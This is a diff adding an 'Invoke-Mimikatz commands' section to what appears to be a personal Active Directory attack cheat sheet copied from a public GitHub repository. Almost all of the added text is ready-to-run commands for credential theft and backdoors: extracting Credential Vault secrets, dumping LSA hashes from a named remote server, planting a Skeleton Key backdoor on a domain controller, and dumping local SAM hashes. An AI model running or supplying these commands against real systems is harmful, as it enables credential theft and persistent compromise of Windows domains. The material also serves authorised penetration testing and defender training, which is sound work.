@@ -1,4 +1,15 @@
 # Mimikatz
+
+Invoke-Mimikatz commands:
+ - Interesting credentials such as those set for Scheduled Tasks are stored in the Credential Vault. These can be extracted using:
+`Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'`
+ - Dump hashes on target machines
+`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <targetserver>`
+ - Skeleton Key
+`Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
+ - Dump hashes from SAM database (local users)
+`Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'`
+
 These are currently directly lifted from https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#powershell-remoting
 I will add and edit as this cheatsheet progresses.
 
